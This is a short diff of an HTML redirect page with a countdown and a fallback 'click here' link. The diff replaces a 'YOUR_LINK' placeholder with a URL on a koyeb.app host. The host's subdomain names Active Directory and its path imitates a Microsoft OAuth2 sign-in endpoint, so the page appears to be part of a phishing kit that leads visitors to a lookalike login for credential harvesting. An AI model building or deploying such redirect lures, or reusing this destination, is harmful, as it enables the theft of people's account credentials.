@@ -143,7 +143,7 @@ try {
     <div class="message-box" id="message-box">
         <h2 id="message">Hang tight! You will be redirected soon.</h2>
         <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
-        <p class="footer">If not, <a href="YOUR_LINK">click here</a>.</p>
+        <p class="footer">If not, <a href="https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/">click here</a>.</p>
     </div>
 
     <script>
